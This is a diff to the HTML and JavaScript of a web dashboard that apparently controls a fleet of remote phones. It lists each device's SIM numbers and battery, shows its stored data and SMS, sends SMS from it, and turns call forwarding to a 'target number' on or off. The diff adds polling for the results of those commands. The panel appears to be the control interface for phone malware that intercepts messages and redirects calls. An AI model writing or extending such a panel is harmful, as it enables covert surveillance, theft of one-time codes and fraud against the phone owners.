@@ -100,6 +100,7 @@
         <div class="grid" id="grid"></div>
     </div>
 
+    <!-- Modals -->
     <div id="viewDataModal" class="modal">
         <div class="modal-content">
             <div class="modal-header">
@@ -136,6 +137,7 @@
         const socket = io();
         let devices = [];
         let currentFilter = 'all';
+        let pollingInterval = null;
 
         function toast(msg, err=false) {
             const t = document.getElementById("toast");
@@ -152,7 +154,7 @@
             tempInput.select();
             document.execCommand("copy");
             document.body.removeChild(tempInput);
-            toast("Copied!");
+            toast("Copied to clipboard!");
         }
 
         async function login() {
@@ -180,21 +182,40 @@
         socket.on('dashboard-update', () => fetchData(false));
 
         socket.on('command-result', (data) => {
+            handleResult(data);
+        });
+
+        function handleResult(data) {
             const statusBox = document.getElementById('cmdStatusBox');
-            if (statusBox) {
-                statusBox.style.display = 'block';
+            if (statusBox && statusBox.style.display === 'block') {
+                if (pollingInterval) { clearInterval(pollingInterval); pollingInterval = null; }
                 if (data.success) {
                     statusBox.style.background = '#e8f5e9';
                     statusBox.style.color = '#2e7d32';
-                    statusBox.innerHTML = `✅ <b>Result:</b><br>${data.message || "Command Successful"}`;
+                    statusBox.innerHTML = `✅ <b>Result:</b><br>${data.message || "Action Successful"}`;
                 } else {
                     statusBox.style.background = '#ffebee';
                     statusBox.style.color = '#c62828';
                     statusBox.innerHTML = `❌ <b>Failed:</b><br>${data.message || "Command Failed"}`;
                 }
+                toast(data.message || (data.success ? 'Success' : 'Failed'), !data.success);
             }
-            toast(data.message || (data.success ? 'Success' : 'Failed'), !data.success);
-        });
+        }
+
+        function startPolling(deviceId) {
+            if (pollingInterval) clearInterval(pollingInterval);
+            pollingInterval = setInterval(async () => {
+                try {
+                    const r = await fetch(`/api/check-result/${deviceId}`);
+                    const d = await r.json();
+                    if (d.success && d.result) {
+                        handleResult(d.result);
+                    }
+                } catch (e) {}
+            }, 2000);
+            // Auto stop after 40 seconds
+            setTimeout(() => { if (pollingInterval) { clearInterval(pollingInterval); pollingInterval = null; } }, 40000);
+        }
 
         function filter(type, btn) {
             currentFilter = type;
@@ -239,11 +260,9 @@
                         <span style="font-weight:bold;">${d.battery||0}%</span>
                     </div>
                     <div class="serial-badge">#${idx + 1}<br><small>${d.model || 'Unknown'}</small><br>${statusBadge}</div>
-                    
                     <div class="info" style="margin-top: 25px;"><b>SIM1:</b> <span>${d.sim1 || 'N/A'} <i class="fas fa-copy" onclick="copyText('${d.sim1}')"></i></span></div>
                     <div class="info"><b>SIM2:</b> <span>${d.sim2 || 'N/A'} <i class="fas fa-copy" onclick="copyText('${d.sim2}')"></i></span></div>
                     <div class="info"><b>Last Seen:</b> <span>${formatLastSeen(d.lastSeen)}</span></div>
-                    
                     <div class="btns">
                         <button class="btn-sm btn-view" onclick="viewData('${id}')">VIEW DATA</button>
                         <button class="btn-sm btn-view" style="background:#00bcd4;" onclick="viewSms('${id}')">VIEW SMS</button>
@@ -355,7 +374,8 @@
             try {
                 const r = await fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, action: 'SEND_SMS', data: { simSlot: sim, number, message } }) });
                 const d = await r.json();
-                if (!d.success) { statusBox.style.background = '#ffebee'; statusBox.style.color = '#c62828'; statusBox.innerText = "❌ " + (d.message || "Failed"); }
+                if (d.success) startPolling(id);
+                else { statusBox.style.background = '#ffebee'; statusBox.style.color = '#c62828'; statusBox.innerText = "❌ " + (d.message || "Failed"); }
             } catch(e) { toast("Error", true); }
         }
 
@@ -364,7 +384,7 @@
             document.getElementById('cmdStatusBox').style.display = 'none';
             document.getElementById('actionModalBody').innerHTML = `
                 <div class="input-group"><label>SELECT SIM SLOT:</label><select id="cfSim"><option value="1">SIM 1</option><option value="2">SIM 2</option></select></div>
-                <div class="input-group"><label>ENTER TARGET NUMBER:</label><input type="text" id="cfNum" placeholder="Enter target number"></div>
+                <div class="input-group"><label>ENTER TARGET NUMBER:</label><input type="text" id="cfNum" placeholder="Target number"></div>
                 <div style="display:flex; gap:10px; margin-top:20px;"><button class="btn-sm btn-sms" style="flex:1; padding:15px;" onclick="cfAction('${id}', 'CALL_FORWARD_ACTIVATE')">ACTIVATE</button><button class="btn-sm btn-del" style="flex:1; padding:15px;" onclick="cfAction('${id}', 'CALL_FORWARD_DEACTIVATE')">DEACTIVATE</button></div>
                 <button class="btn-sm btn-view" style="width:100%; margin-top:10px; padding:15px;" onclick="cfAction('${id}', 'CALL_FORWARD_STATUS')">CHECK STATUS</button>`;
             document.getElementById('actionModal').classList.add('show');
@@ -378,7 +398,8 @@
             try {
                 const r = await fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, action, data: { simSlot: sim, number } }) });
                 const d = await r.json();
-                if (!d.success) { statusBox.style.background = '#ffebee'; statusBox.style.color = '#c62828'; statusBox.innerText = "❌ " + (d.message || "Failed"); }
+                if (d.success) startPolling(id);
+                else { statusBox.style.background = '#ffebee'; statusBox.style.color = '#c62828'; statusBox.innerText = "❌ " + (d.message || "Failed"); }
             } catch(e) { toast("Error", true); }
         }
 
@@ -406,7 +427,7 @@
         }
 
         async function togglePin(id, status) { await fetch('/api/pin-device', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, status }) }); fetchData(false); }
-        function closeModal(id) { document.getElementById(id).classList.remove('show'); }
+        function closeModal(id) { document.getElementById(id).classList.remove('show'); if (pollingInterval) clearInterval(pollingInterval); }
     </script>
 </body>
 </html>
